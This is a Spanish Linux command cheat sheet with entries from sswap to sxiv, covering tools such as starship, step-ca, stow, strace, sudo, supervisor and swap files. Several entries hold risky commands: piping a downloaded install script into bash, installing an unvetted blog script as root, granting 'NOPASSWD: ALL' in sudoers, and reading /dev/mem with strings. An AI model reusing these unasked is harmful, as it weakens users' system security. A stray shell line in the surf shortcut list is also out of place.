        # si la salida muestra "Usage"
        run test_in_stderr bash -c "ip s"
        assert_in_stderr "Usage"
        # comprobar que no existe salida
        run test_no_stdout bash -c "echo"
        assert_no_stdout
        # ver si en la salida sale "debian"
        run test_in_stderr bash -c "ip s"
        assert_no_stdout "debian"
        # si en una entrada existe error
        run test_in_stdout bash -c "ehrjqk"
        assert_stderr
        # si el código de salida es "0" [correcto]
        run test_in_stdout bash -c "echo 'linux es un sistema genial'"
        assert_exit_code "0"
        # Si la variable $USER es pep [sustituir por quien proceda]
        run test_in_stdout bash -c "echo $USER"
        assert_equal "pep" "$USER"
$ chmod +x tests.sh
$ ./ tests.sh


sswap
[secure-delete]. Borrado seguro de swap. Previamente desactivar con swapoff /dev/sda7 y al finalizar el proceso volver a activarla con swapon /dev/sda7 [Si no sabemos donde se encuentra la swap: cat /proc/swaps. Argumentos paracidos a srm [ver] y sfill [ver]. El espacio se sobreescribe 38 veces.
$ sswap -f /dev/sda7 (Modo rápido e inseguro)
$ sswap -lv /dev/sda7 (Como lanzar dos veces sswap -f y mostrando el proceso)


st
Terminal simple.
$ st -t Reiniciar -e sudo init 6 (Abrir un terminal st con título para entrar la contraseña y reiniciar)


stalonetray
Applet para albergar el area de notificación.
$ stalonetray -bg #A78B5C -d title -geometry 6x1-0+0 -i 30 (con el color especificado [-bg], decoración de ventana [-d], las medidas [6x1] y la situación en pantalla [-0+0, abajo, derecha])
Algunas opciones:
-d	(none, title, border, all)
situación:
Abajo a la izquierda	5x1+0-0
Abajo en el centro (1024x768) + 20 píxeles elevado	5x1-450-20
Abajo a la derecha	5x1-0-0
Arriba a la izquierda	5x1+0+0
Arriba a la izquierda + 20 píxeles descendido	5x1+0+20
Arriba en el centro (1024x768)	5x1+450+0
Arriba a la derecha	5x1-0+0
Arriba a la derecha + 20 píxeles descendido	5x1-0+20
Abajo a la izquierda + 20 píxeles elevado	5x1+0-20


starship
Un promt para la terminal escrito en Rust, mínimo, rápido y personalizable. Descargar:
   $ curl -fsSL https://starship.rs/install.sh | bash
Para incorporarlo a bash entrar en ~/.bashrc la linea:
   eval "$(starship init bash)"
Y recargar:
  $ source ~/.bashrc
Muestra de archivo de configuración
$ nano ~/.config/starship.toml
        # Obtener terminaciones del editor basado en el esquema de configuración
        "$schema" = 'https://starship.rs/config-schema.json'
        #
        # Inserta una línea en blanco entre las instrucciones del intérprete de comandos
        add_newline = true
        #
        # Reemplaza el símbolo '❯' en el prompt con ''➜'
        [character] # The name of the module we are configuring is 'character'
        success_symbol = '[➜](bold green)' # The 'success_symbol' segment is being set to '➜' with the color 'bold green'
        #
        # Desactiva el módulo del paquete, ocultándolo del prompt completamente
        [package]
        disabled = true
        #
        # indicador de la shell
        [shell]
        bash_indicator = '󰈺 '
        unknown_indicator = 'mystery shell'
        style = 'cyan bold'
        disabled = false
        #
        # el tiempo
        [time]
        disabled = false
        format = '🕙[\[ $time \]]($style) '
        time_format = '%T'
        #
        # nombre del usuadio
        [username]
        style_user = 'white bold'
        style_root = 'red bold'
        format = 'user: [$user]($style) '
        disabled = false
        show_always = true
        aliases = { "corpuser034g" = "matchai" }


startlxde
Iniciar sesión de escritorio LXDE. Por defecto, carga openbox, lxpanel, pcmanfm, dbus-launch y lxsession.
$ startlxde


startx
Arrancar sistema gráfico
$ startx -- :1 (una segunda sesión gráfica accesible en ^Alt + F8)


stat
Estadísticas de archivo, directorios y sistemas
# stat /etc/passwd
# stat -c '%A %a' /etc/passwd (Mostrar los permisos de forma clásica i en formato octal)
# stat /usr
# stat -f /
$ stat -c "%s" archivo (medida del archivo)
$ stat -c '%n %U:%G-%a' * (Mostrar nombre archivo, propietario, grupo y permisos en formato octal)
$ stat / | awk '/Naixement: /{print $2 " " substr($3,1,5)}' (fecha de instalación del sistema)
Nota.- Si la instalación fue en castellano sustituir "Naixement" por "Creación" o "Bird" si en inglés)


status
Verifica si un servicio está activo o no.
$ status ssh


stdbuf
Ejecutar comandos con operaciones modificadas para almacenamiento en búfer.
$ tail -f /var/log/apache2/access.log | stdbuf -oL cut -d ' ' -f1 (ver accesos únicos)
$ stdbuf -o 0 ls
$ stdbuf -o0 -e0 ls >> log_file


stdsyslog
La utilidad ejecuta un programa, lee todo lo que genera en un conjunto de descriptores de archivos y los muestra de forma predeterminada por la salida estándar y error estándar y lo registra en el registro del sistema [/var/log/syslog o si existen errores en /var/log/error].
$ stdsyslog -l (lista los niveles de syslog disponibles)
$ stdsyslog -p archivo (archivo en el que escribir el ID)
$ stdsyslog -p archivo -d 1:alert -d 2:crit -d 3:info programa


steghide
Detectar y extraer mensajes incrustados dentro de una imagen o música
$ steghide embed -cf imagen.jpg -ef archivo_texto  (incrustar un texto en una imagen)
$ steghide embed -cf archivo.wav -ef archivo_texto (incrustar un texto en un archivo de música)
$ steghide extract -sf imagen.jpg  (extraer el archivo incrustado)


step
Herramienta para construir, operar y automatizar sistemas y flujos de trabajo de Infraestructura de clave pública [PKI]. step actúa como interfaz front-end para Certificate Manager y step-ca, una autoridad de certificación [CA] X.509 y SSH en línea.
$ wget https://dl.smallstep.com/cli/docs-cli-install/latest/step-cli_amd64.deb
# dpkg -i step-cli_amd64.deb
$ useradd step (crear un usuario que se utilizará para ejecutar el servicio con su directorio personal [/home/step])
# nano  /etc/systemd/system/step-ca.service
[Unit]
        Description=step-ca
        After=syslog.target network.target
[Service]
        User=step
        Group=step
        ExecStart=/bin/sh -c '/bin/step-ca /home/step/.step/config/ca.json --password-file=/home/step/.step/pwd >> /var/log/step-ca/output.log 2>&1'
        Type=simple
        Restart=on-failure
        RestartSec=10
[Install]
        WantedBy=multi-user.target
# chown -R step:step /home/step (asegurarse de que se haya creado el directorio de inicio para el usuario step)
$ step ca init (solicitarán detalles de la CA que se está creando: nombre, nombres DNS o direcciones IP para agregar, puerto de escucha, email, contraseña)
Nota.- La contraseña se apunta en /home/step/.step/pwd y preferible que solo tenga permisos de lectura:
$ chmod 400 /home/step/.step/pwd
$ step ca provisioner add acme --type ACME (agregar el aprovisionador de ACME a la configuración)
1.-
Para que los certificados sean válidos por más de 24 horas, modificar el archivo:
$ nano /home/step/.step/config/ca.json
Y agregue la siguiente configuración en la sección acme y extenderá la vida útil de los certificados a 90 días:
          "type": "ACME",
          "name": "acme",
          "claims": {
              "maxTLSCertDuration": "2160h",
              "defaultTLSCertDuration": "2160h"
              }
Despues de cambios en la configuración reiniciar el servidor
# systemctl start step-ca


sticky
Cuando todos los ficheros del directorio solo pueden ser modificables por sus propietarios, naturalmente dejando a parte a root.
       $ ls -ld /tmp
       drwxrwxrwt 20 root root 540  4 d’oct.   12:18 /tmp
Se muestra con la última "t" en lugar de la "x" en los permisos de grupo.


stjerm
Consola tipo guake.
$ stjerm -k f12 -s left -o 70 -h 250 -w 1280 (Que aparezca pulsando F12, con barra de escroll a la izquierda, opacidad del 70% y especificando ancho y largo)
Algunas opciones:
-ah (Ocultar automáticamente la ventana cuando no está enfocada)
-bg red (Color de fondo)
-bgimg imagen.png (Establecer una imagen de fondo)
-fn (Tipo y tamaño de fuente)
-fg blue (Color de la fuente)
-p (Posición de la ventana [valores: top, bottom, left, right])


stow
Es un administrador de instalación de software para /usr/local. Usando enlaces simbólicos, Stow ayuda a mantener las instalaciones separadas (/usr/local/stow/emacs vs. /usr/local/stow/perl, por ejemplo) mientras mantiene que todas están bajo /usr/local. Incluye la aplicación chkstow.
$ echo "alias stow='sudo STOW_DIR=/usr/local/stow /usr/bin/stow'" >> ~/.bashrc
$ source ~/.bashrc
Si vamos a instalar, por ejemplo emacs, los descargamos y compilamos:
$ ./configure --prefix=/usr/local/stow/emacs
$ make
# make install
La instalación crea un enlace simbólico de /usr/local/bin/emacs a /usr/local/stow/emacs/bin/emacs.
$ stow emacs (informar a stow de la instalación)
$ stow -R emacs (actualizar la aplicación instalada)
$ stow -D emacs (desinstalar)
# rm -r /usr/local/stow/emacs (eliminar su directorio)
# stow -D emacs-21.3 -S emacs-21.4a (actualizar una versión de emacs)
$ chkstow (de vez en cuando limpiar el árbol de destinos)
$ chkstow -b (Comprueba el directorio de destino en busca de enlaces simbólicos falsos [que apuntan a archivos inexistentes])


strace
Muestra las llamadas al sistema originadas por un proceso.
$ strace comando
$ strace -p PID (Por número de proceso)
$ strace -c comando -o traza.txt (mostrar resumen de llamadas y errores durante la ejecución y redirigido a un archivo)
Algunas opciones:
-f (Incluir posibles forks que haga un programa, por ejemplo httpd)
-v (Muestra el máximo de información)
-s 8192 (Valor de 8192 como limite de longitud de las cadenas. Por defecto 32)


streamer
Herramienta para capturar imágenes individuales o múltiples de un video y grabar películas desde un dispositivo.
$ streamer -o captura.ppm  (capturar un frame)
$ streamer -t 10 -r 2 -o capturas.jpeg (capturar 10 frames y 2 por segundo)
$ streamer -t 0:30 -F stereo -o soundtrack.wav (grabar 30 segundos con sonido estereo)


streamripper
Ripear a partir de emisoras icecast (www.icecast.com) y showcast (www.showtcast.com). Crea una carpeta en el presente directorio.
$ streamrippwer http://yp.shoutcast.com/sbin/tunein-station.pls?id=321414 -l 4000 (grabar durante 4000 segundos)


stress
Herramientas para realizar un test de carga del sistema.
# stress -c 8 -i 4 -m 2 --vm-bytes 128M -t 20S
Opciones:
-c (8 multiples ciclos infinitos de raices cuadradas para la cpu)
-i (Introduce 4 ciclos infinitos que ejecutan la llamada al sistema sync())
--hdd-bytes 3G (carga de escritura en disco de 3G. Opciones: B,K,M,G)
-t 20s (Tiempo que durará el proceso, 20 segundos. Opciones: s,m,h,d,y)


stressant
Colocar en varias partes del sistema (CPU, RAM, disco, red) una gran carga para detectar fallas y así asegurarse de que funcionen de manera confiable.
# stressant (prueba por defecto)
# stressant --fileSize 1M --cpuBurnTime 1s --iperfTime 1 (Prueba muy rápida, útil para ejecutar si está preocupado por el bloqueo de la máquina)
# stressant --diskPercent 100% --overwrite --cpuBurnTime 24h --smart (Prueba exhaustiva con limpieza completa del disco y prueba larga SMART)
# stressant --no-information --no-cpu --no-disk --iperfServer servidor.net (Prueba de red solo en un servidor dedicado)


stressapptest
Herramienta para realizar un test de carga del sistema.
# stressapptest -s 20 -M 256 -m 8 -C 8 -W
Algunas opciones:
-M mbytes  (Cantidad de megabytes de memoria RAM para realizar las pruebas. Por defecto toda la disponible)
-s 20 (Tiempo que durará el proceso)
-m 8 (Cantidad de procesos de copiado de memoria)
-W (llevar al límite la cpu)


strings
Analizar la memoria o una particion
$ strings /dev/mem
$ strings /dev/sda5


stterm
En realidad el paquete se llama st pero en Debian se llama stterm por razones históricas. Es un emulador de terminal con un enfoque en la simplicidad, claridad y frugalidad. La filosofía del proyecto es mantener las cosas simples, mínimas y utilizables. st admite mannejo del portapapeles, atajos de mouse y teclado, UTF-8, ancho de caracteres, redimensionar, 256 colores.


stty
Muestra/modifica las características del terminal o de un comando.
$ stty -a  (muestra todas las teclas de control, algunas obsoletas. Las más útiles: ^c [para el comando actual], ^d [final de flujo de entrada], ^u [borrar desde la posición actual al principio de linea] y ^w [borrar desde la posición actual al principio de la palabra])
$ stty size   (muestra número de columnas y lineas)
$ stty speed  (velocidad en baudios)
$ stty -a | sed -e 's/;/\n/g' | grep eof (Ver una en concreto)
$ stty eof ^F (Modificar la conbinación de teclas de "eof" a Control+f. Por defecto seria Control+D)
1-
	#!/bin/bash
	# ejemplo para desactivar echo
	# para que no se visualice el pass
	echo
	stty -echo
	read -p "Password: " PAS
	stty echo
	echo -e "\n"
	echo $PAS
	echo


stumpwm
Gestor de ventanas atilado escrito en common lisp y que solo usa el teclado. Los mesajes de texto, por defecto, aparecen en la parte superior derecha de la pantalla. El archivo de configuración de los atajos está en /usr/share/common-lisp/source/stumpwm/bindings.lisp.
Atajos:
	C-t C-g (Abortar lo que se haya pulsado)
	C-t n [C-t Space] (Ir a la siguiente ventana de la lista)
	C-t p (Ir a la ventana anterior de la lista)
	C-t " (Seleccionar y enfocar una ventana de una lista)
	C-t w (Imprime lista de ventanas, número y nombre)
	C-t : (evalua [eval] expresiones: (+ 2 2): evalúa una suma de dos más dos, (loadrc): evalúa el fichero .stumpwmrc, (quit): sale de la sesión)
	C-t o [C-t TAB] (En una ventana con varios paneles va saltando entre ellos)
	C-t flechas (Mueve el foco de un panel hacia el panel del lado que se indique con las flechas)
	C-t f (Seleccionar un panel por su número)
	C-t s (Dividir una ventana o un panel horizontalmente)
	C-t S (Dividir una ventana o un panel verticalmente)
	C-t k (Mata el panel actual y el programa que ejecute)
	C-t K (Equivalente a un kill -9 para el marco actual)
	C-t c (Ejecutar una terminal. xterm por defecto)
	C-t e (Ejecutar xemacs)
	C-t a (Muestra hora y fecha)
	C-t ! (Pregunta la aplicación gráfica que se quiere lanzar)
	C-t R (Suprimir una división. Si sólo existe una se maximiza)
	C-t b (Enviar el puntero del ratón a la esquina inferior derecha de la pantalla)
	C-t - (Minimizar aplicaciones del panel o ventana y mostrar la "fondo raiz")
	C-t Q (Eliminar todas la divisiones y maximizar el marco del foco)
	C-t m (Ver el último mensaje. Pulsando nuevamente las teclas muestra los anteriores)
	C-t t (Envia un C-t cuando se usan programas que usan esta combinación de teclas como firefox)
grupos (equivalente a escritorios):
	C-t g c (Crear nuevo grupo)
	C-t g g (Mostrar la lista de grupos)
	C-t g N [C-t g SPC](Ir al siguiente grupo de la lista)
	C-t G (Ver todos los grupos y las ventanas de cada grupo)
	C-t g p (Ir al grupo anterior de la lista)
	C-t Fn (Salta al grupo "n" [F1, F2...])
	C-t g k (Mata el grupo actual. todas las ventanas se fusionan con el siguiente grupo)
	C-t g m (Mover la ventana actual al grupo que se le indique)
	C-t g 2 (Ir al grupo con el dígito 2)
	C-t g ' (Seleccionar un grupo por nombre o por número)
	C-t g " (Seleccionar un grupo de una lista y cambiar a él)
	C-t g A [C-t g r] (Cambiar el nombre del grupo actual)
Información y ayuda:
	C-t i (Muestra información sobre la ventana actual)
	C-t w (Muestra unos segundos información de todas las ventanas)
	C-t F (Informa del panel activo)
	C-t ? (Muestra los comandos de ayuda)
	C-t h ? (lista atajos)
	C-t h k (Describe una combinación de teclas que se especifique)
	C-t h f (Describe una función que se especifique)
	C-t h v (Describe una variable que se especifique)
	C-t h w (Enumerar todas las secuencias de teclas asociadas a la orden especificada)
	C-t h c (Describe el comando que se especifique)
	C-t v (Mostrar la versión de stumpwm)
1.-
Para que se muestre la opción en el gdm:
	# nano /usr/share/xsessions/stumpwm.desktop
Y pegar el siguiente texto:
	[Desktop Entry]
	Encoding=UTF-8
	Name=StumpWM
	Comment=Tiling Window Manager
	Exec=/usr/bin/stumpwm
	Icon=
	loadType=Application
2.-
Colocar un fondo de pantalla:
$ nano .stumpwmrc (Si no existe lo creamos)
Y añadimos fondo negro:
	(set-bg-color "black")
O bien una imagen (Precisa paquete xloadimage)):
	(run-shell-command "xsetbg ~/fondos/fichero.png")
3.-
Abrir una sesión gráfica stumpwm junto a otra:
Crear un usuario con su home (P.e. pedro)
# useradd -d /home/pedro -s /bin/bash -m pedro
Entrar la contraseña de pedro:
# passwd pedro
Crear en su /home el archivo:
# nano .xinitrc
Con el contenido de la ruta a stumpwm:
	/usr/bin/stumpwm
Entrar en una tty (P.e la tty3):
	Crtl + Alt + F3
Y logearse como pedro. Una vez entrado en el sistema lanzar:
$ startx
Y tendremos una sesion stumpwm en la tty8


su
Cambiar de usuario
$ su -m           (Cambia de root [#] a usuario normal [$])
Nota.-  Tambien puede hacerse tecleando “exit o con Ctrl + d”
$ su -  (cambia a root)
$ su -c htop (Pedirá contraseña para lanzar htop, pero cuando se salga el prompt será de usuario, no de root)
$ su -c "!!" root (Ejecutar el último comando ejecutado como root)
$ su - usuario (recarga todos los archivos del perfil del usuario y se reseteen todos los paths y alias. Si no se especifica usuario, por defecto es root)


sublime-text
Editor. Descargar según arquitectura de http://www.sublimetext.com/2 o via ppa (Debian):
$ wget http://blog.anantshri.info/content/uploads/2010/09/add-apt-repository.sh.txt
# mv add-apt-repository.sh.txt /usr/sbin/add-apt-repository
# chmod o+x /usr/sbin/add-apt-repository
# chown root:root /usr/sbin/add-apt-repository
# add-apt-repository ppa:webupd8team/sublime-text-2
# apt-get update
# apt-get install sublime-text-2
Teclas de control:
Ctrl + p (abrir cuadro de diálogo [goto anything] donde se entran las consultas)
:palabra (Buscar "palabra" en el archivo abierto)
:157 (Ir a la linea 157)
Ctrl + ` (Ir a la consola de sublime text)
Ctrl + Mayu + p (Acceder al control de paquetes. Entrando "Install package" se instalan nuevos plugins y con "Remove package" se desinstalan)
Ctrl + n (Abrir nuevo documento)


subnetcalc
Calculadora de direcciones de subred IPv4/IPv6. Para una dirección IPv4 o IPv6 y una máscara de red o longitud de prefijo determinadas, calcula la dirección de red, la dirección de transmisión, el número máximo de hosts y el rango de direcciones de host. Además, imprime las direcciones en formato binario para mejor comprensión y puede identificar el tipo de dirección [multidifusión, local única, local de sitio, etc.] y extraer información adicional como por ejemplo, tipo, alcance, ID de interfaz, etc. Tambien puede generar prefijos locales únicos IPv6.
$ subnetcalc 192.168.8.149
$ subnetcalc 192.168.8.1/24
$ subnetcalc lapipaplena.wordpress.com


subversion
[Apache Subversion, svn]. Sistema de control de versiones centralizado. Los sistemas de control de versiones permiten que muchas personas, que pueden estar distribuidas geográficamente, colaboren en un conjunto de archivos [código fuente, sitios web, etc]. Incluye las siguientes herramientas svn, svnadmin, svnauthz, svnauthz-validate, svnbench, svndumpfilter, svnfsfs, svnlook, svnmucc, svnrdump, svnserve, svnsync y svnversion


succade
[lemonbar]. Es un gestor que ejecuta bloques repetidamente y envía su salida a Lemonbar. Se descarga de https://github.com/domsson/succade.
Ejemplo de archivo de configuración [variante de los que existen en github]
nano ~/.config/succade/succaderc
        [bar]
        name = "testbar"
        blocks = "System | Shell | date time"
        height = 24
        areas = 16
        foreground = "#edd5d5"
        background = "#f85a5a"
        line-color = "#63d16f"
        line-width = 2
        #
        [default]
        label-foreground = "#0f0505"
        affix-foreground = "#555555"
        margin = 8
        padding-left = 1
        prefix = "[ "
        suffix = " ]"
        underline = true
        #
        [System]
        command = "uname -a"
        label = "System"
        #
        [Shell]
        command = "echo $SHELL"
        label = "Shell"
        #
        [date]
        command = "date +'%Y-%m-%d'"
        interval = 1
        label = "DATE"
        #
        [time]
        command = "date +'%H:%M:%S'"
        interval = 1
        label = "TIME"
        mouse-left = "xclock"
        margin-right = 8


suckless-tools
Conjunto de utilidades minimalistas y ligeras, diseñadas con la filosofía "Simple is better" [lo simple es mejor]. Están pensadas para ser usadas con gestores de ventanas minimalistas como DWM, Awesome, i3, etc aunque es independiente del gestor de ventanas utilizado. Incluye las aplicaciones dmenu, dmenu_path, dmenu_run, lsw, slock, sprop, sselp, ssid, stest, swarp, tabbed.default, tabbed.meta, wmname y xssstate.
$ dmenu_path | dmenu | xargs -r firefox & (lista las rutas de los ejecutables, "dmenu" permite seleccionar uno, y "xargs -r firefox &" ejecuta el seleccionado)
$ dmenu_path (listar todos los ejecutables disponibles en el $PATH)
$ dmenu_run -nb yellow -nf red -p bash (muestra una barra de color amarillo y letra roja con aplicaciones del sistema)
$ lsw (lista las ventanas abiertas en el servidor X)
$ slock (la pantalla se oscurecerá y se quedará bloqueada hasta que se introduzca la contraseña)
$ sselp (pegará en la consola lo que esté en el portapapeles)
$ swarp 100 200 (mover el puntero a la posición indicada)
$ xssstate -i (estado del protector de pantalla en X11 en milisegundos)
$ xssstate -s (estado actual del protector de pantalla. "on" activo, "off" no activo, "disabled" desactivado)


sudo
Utilidad que permite a un usuario ejecutar programas con privilegios de root. En algunas distros sólo el usuario creado durante la instalación puede ejecutar sudo con privilegios de root, los demás han de ser agregados al grupo admin. Incluye las aplicaciones: cvtsudoers [convertir entre formatos de archivo sudoers], sudoedit [Ejecutar comandos como otro usuario] y sudoreplay [enumera los registros de salida creados por sudo]
$ sudo -k   (limpia la clave sudo introducida)
$ sudo -u usuario comando   (ejecutar el comando como un usuario privilegiado distinto de root)
$ sudo -l    (ver los permisos de sudo que tiene un usuario)
$ sudo !! (Ejecutar el último comando con sudo)
Pueden añadirse las siguientes lineas en /etc/sudoers:
	Defaults passprompt=”mi frase solicitando la contraseña...”
	Defaults badpass_message=”mi frase si se entra erronea...”
	usuario    ALL=(ALL) ALL  (Añadir el usuario a sudo)
	Defaults:usuario !authenticate  (si no queremos que nos pida la contraseña)
	usuario ALL=NOPASSWD: /usr/sbin/firestarter (Para que no pida contraseña al arrancar una aplicación concreta)
O añadir a la linea Defaults, algunos parámetros separados por comas:
	timestamp_timeout=5   (La contraseña se guardará 5 minutos.)
	insults    (Te mostrará insultos si fallas la contraseña)
	passwd_tries=2   (Permitir 2 errores al entrar la contraseña. Por defecto 3)
	rootpw (Para que nos pida la contraseña de root y no la de usuario)
Ejemplos:
	Defaults	 !lecture,tty_tickets,!fqdn,timestamp_timeout=0,insults
	Defaults@192.168.1.2 !lecture,tty.... (Permitir ejecución sólo desde nuestra máquina)
1.-
Añadir un usuario con privilegios de root:
# nano /etc/sudoers.d/10-installer
Y añadir la linea:
USER     ALL=(ALL) NOPASSWD: ALL
2.-
Para que al entrar un contraseña en la terminal aparezcan asterisco:
En la linea: Defaults env_reset
Añadir "pwfeedback" dejándola:
Defaults env_reset , pwfeedback
3.-
Ver la totalidad de acciones realizadas con el comando sudo
# journalctl _COMM=sudo
4.-
Significado de: %sudo ALL=(ALL:ALL) ALL
Un % especifica que se trata de un grupo, en este caso el grupo sudo. ALL=(ALL) o ALL=(ALL:ALL) especifica que en cualquier host que pueda tener este archivo, sudo puede ejecutar cualquier comando. El ALL final especifica que sudo puede ejecutar esos comandos como cualquier usuario en el sistema.
5.-
Colocar entradas personalizadas en grub
# nano /etc/grub.d/40_custom
Añadir las lineas:
        menuentry "Apagar el sistema" {
                echo "Apagando el sistema..."
                halt
        }
        #
        menuentry "Reiniciar sistema" {
                echo "Reiniciando el sistema..."
                reboot
        }
# update-grub



sudoedit
Ejecutar un comando como otro usuario (ver sudo)
$ sudoedit -u root /etc/sudoers


sudosh
Registra lo que hace un usuario en el sistema cuando requiere privilegios de administrador y lo almacena en dos ficheros de log, uno para los comandos y otro para los tiempos. Descarga: <http://sourceforge.net/projects/sudosh2/> y el ejecutable se instala en /usr/local/bin/sudosh
Ajustes
# nano /etc/sudoers
Y añadir la linea:
	Cmnd_Alias SUDOSH=/usr/local/bin/sudosh
Incluir sudosh en las shells:
# echo "/usr/local/bin/sudosh" >> /etc/shells
Añadimos la ruta al final del usuario que queremos monitorizar:
# nano /etc/passwd
	games:x:5:60:games:/usr/games:/usr/local/bin/sudosh
# sudosh (Inicia la grabación de todo lo que ocurre en la consola)
# sudosh-replay (Muestra las grabaciones archivadas en /var/log/sudosh/)
# sudosh-replay templix-root-script-1353428989-Eji70wlZOAuIE4HM (Reproduce la escogida)


sulogin
permite el ingreso del superusuario al sistema. Suele ser invocado por init cuando el sistema entra en el modo monousuario.


sum
Muestra la suma de verificación y el número de bloques del fichero.
$ sum -s archivo  (Emplea el algoritmo de suma BSD con bloques de 1 kB)
$ sum -r archivo  (Emplea el de System V, con bloques de 512 octetos)


summain
Realiza sumas de comprobación de archivos y busca sus metadatos.
$ summain --output=summain.txt -c MD5 archivo (Lo guardará en summain.txt y suma de verifación en MD5. Por defecto es SHA1. Otras opciones: SHA224, SHA256, SHA384, SHA512)
$ summain --output=Comprobación_dir -c SHA512 /home/usuario/ (De todos los archivos del directorio del usuario)


super
Permite a usuarios específicos ejecutar scripts u otros comandos con privilegios de root sin usar "sudo".
S super (comandos permitidos)
$ super -H (lista comandos correctos)
$ super -c /etc/super.tab (verifica si existen errores en el archivo de configuración)
$ super service apache2 restart (si se tiene permisos para usar "super", podrá reinicarse un servicio que requiere privilegios de root)
Para entrar un usuario en el archivo de configuración para usar, por ejemplo, apache2:
# nano /etc/super.tab
Y añadir la linea:
apache2  /sbin/apache2  USER


supervisor
Herramienta de control de procesos que permite administrar y monitorear servicios y demonios. Es un sistema para controlar y mantener el estado del proceso. Por ejemplo, si tenemos un script que siempre está corriendo, creamos un archivo de configuración para él:
            # nano /etc/supervisor/conf.d/mi_proceso.conf
            [program:mi_proceso]
            command=python3 ~/scripts/script1.sh
            autostart=true
            autorestart=true
            stderr_logfile=/var/log/mi_proceso.err.log
            stdout_logfile=/var/log/mi_proceso.out.log
Este archivo dice a supervisor que ejecute el script de bash, que lo reinicie si se detiene y registrar tanto los errores como la salida estándar en archivos de log.
# supervisorctl reread (recargar la configuración)
# supervisorctl update
# supervisorctl status (controlar los procesos que gestiona la aplicación)
# supervisorctl start mi_proceso (iniciar el proceso)
# supervisorctl stop mi_proceso (pararlo)
# supervisorctl restart mi_proceso (reiniciar)


surf
[dmenu, wget]. Navegador
$ surf -i URL (Deshabilitar imagenes)
$ surf -p URL (Deshabilitar plugins)
$ surf -s URL (Deshabilitar Javascript)
Atajos
Esc (Stop )
	^h (Historial)
	^l (Hacia delante en el historial)
	^k (ir hacia arriba de la página)
	^j (ir hacia abajo de la página)
	^K (Incrementar el zoom)shopt –s extglob
	^J (Disminuir el zoom)
	^I (Resetear el zoom)
	^n (ir al siguiente resultado de la busqueda)
	^N (ir al anterior resultado)
	^g (Abrir la barra de direcciones [demenu])
	^P (Abre dialogo de impresión)
	^r (Recargar página)
	^R (Recargar sin usar la caché)
	^o (Ver código fuente)


surfraw (sr)
Buscador de significados en la web. Antes de usar, especificar los navegadores que se usarán en teminal y en las X, mostrando la ruta absoluta a los ejecutables:
# nano /etc/xdg/surfraw/conf
	...
	# name/path of text browser executable
	# e.g links, lynx, w3m
	def   SURFRAW_text_browser /usr/bin/elinks
	# name/path of browser executable
	# e.g mozilla, netscape etc
	def   SURFRAW_graphical_browser /usr/bin/firefox
$ sr wikipedia -l=es Palabra_a_buscar (buscar en wikipedia y en español)
$ sr -elvi | less  (listar los sitios disponibles donde buscar)


suricata
Sistema de detección de intrusiones de red (IDS). Se basa en reglas para detectar una variedad de ataques/sondeos mediante la búsqueda de contenido de paquetes. Este nuevo motor admite la detección automática de múltiples subprocesos (IP, TCP, UDP, ICMP, HTTP, TLS, FTP y SMB), descompresión de Gzip y coincidencia rápida de IP.
# suricata --list-runmodes (listar los run modos posibles)
# suricata -c /etc/suricata/suricata.yaml -i eth0 -D (forma básica, activando el daemon)
# tail -f /var/log/suricata/fast.log (comprobar las alertas)


suspend
Parar la ejecución de un proceso hasta que se recibe una señal de continuación.
# suspend -f (Pasará de root a nuestro usuario)
Un proceso de ejemplo:
        bash> pwd
        /home/pep
        bash> zsh
        debian% cd Vídeos
        debian% pwd
        /home/pep/Vídeos
        debian% suspend
        [1]+  Aturat                  zsh
        bash> pwd
        /home/pep
        bash> fg
        zsh
        debian% pwd
        /home/pep/Vídeos
        debian% exit
        bash> pwd
        /home/pep


suspicious-source
Script que genera una lista de archivos que no son archivos fuente comunes. Esto debe ejecutarse en la raíz de un árbol de fuentes para encontrar archivos que podrían no ser la "forma preferida de modificación" que requieren la licencia GPL y otras licencias.
# suspicious-source -d /usr/bin


sv
[runit]. Controlar y gestionar servicios monitoreados.
$ sv start nginx (iniciar un servicio)
$ sv stop nginx (parar un servicio)
$ sv restart nginx (reinicar un servicio)
$ sv status nginx (consultar estado de un servicio)
$ sv supervise nginx (supervisar un servicio)
$ sv down nginx (pausar un servicio)
$ sv up nginx (reanudar un servicio)
$ sv hup nginx (reiniciar un servicio si ya está en ejecución)
$ sv force-stop nginx (forzar parar un servicio)
$ sv reload nom_del_servei (recargar la configuración de un servicio sin pararlo)
$ sv status /etc/service/* (listar servicios)


swap
Tambien llamado memoria de intercambio o memoria virtual, es la que se sirve del espacio en el disco duro en lugar del módulo de memoria. Las aplicaciones usan la memoria RAM para ejecutarse en el ordenador cuando no hay muchas ejecutandose pero si hay muchas o estas necesitan mucha RAM o no hay RAM suficiente para todas es cuando entra en acción la swap. Una de las desventajas de utilizar la swap es que el sistema se vuelve más lento ya que la velocidad de intercambio de información entre un disco duro y la RAM es abismalmente diferente. La memoria RAM es unas 1000 veces más rápida que un SSD y 100.000 veces más rápida que un HDD. El tamaño de una swap en un equipo con una memoria de 8 GB o más, como norma general es 2GB. Reservar para la swap más de 2 GB es esteril pero aunque un equipo no tenga 8 GB de memoria es aconsejable no dejar una swap inferior a 1GB.
1.-
Como crear un archivo swapfile.
# dd if=/dev/zero of=/swapfile bs=1M count=16384 status=progress (crear un archivo de intercambio de 16 GB [16 x 1024 = 16384])
# chmod 600 /swapfile (permisos apropiados de lectura y escritura)
# mkswap /swapfile (formatear...)
# swapon /swapfile (..y habilitar el archivo de intercambio)
# bash -c "echo /swapfile none swap defaults 0 0 >> /etc/fstab" (habilitar el archivo en el arranque)
# swapoff -v /swapfile (desactivar el archivo para eliminarlo)
# rm /swapfile (eliminar el archivo)
# sed -i '/\/swapfile/d' /etc/fstab (eliminar la entrada que agregamos en /etc/fstab.)


swapoff
Desactivar una partición swap.
$ swapoff -a (Desactivar todas las especificadas en /etc/fstab)


swapon
Activar una partición swap.
$ swapon /dev/hda5
$ swapon -a (Activar todas las particiones swap del /etc/fstab)
$ swapon -s (Comprobar estado actual de la memória swap)


swappiness
Uso de la swap por parte del sistema. Ver sysctl.
$  cat /proc/sys/vm/swappiness


swapspace
Complemento del sistema que adapta de forma continua y automática el espacio de memoria virtual disponible a las necesidades de memoria reales. Reclama espacio en disco para usarlo como espacio de intercambio cuando sea necesario y lo libera para que lo utilice el sistema de archivos cuando deja de ser necesario.
$ systemctl status swapspace.service (comprobar si está activo)


switchdesk
Sin argumentos, mostrará un cuadro de diálogo que permite al usuario elegir entre los escritorios disponibles instalados en el sistema en Fedora, Cent OS y Red Hat.
$ switchdesk kde (cambia el entrono de escritorio a kde)
$ switchdesk gnome (cambia a gnome)


sxiv
Visor de imágenes con las funciones básicas necesarias para una visualización rápida.
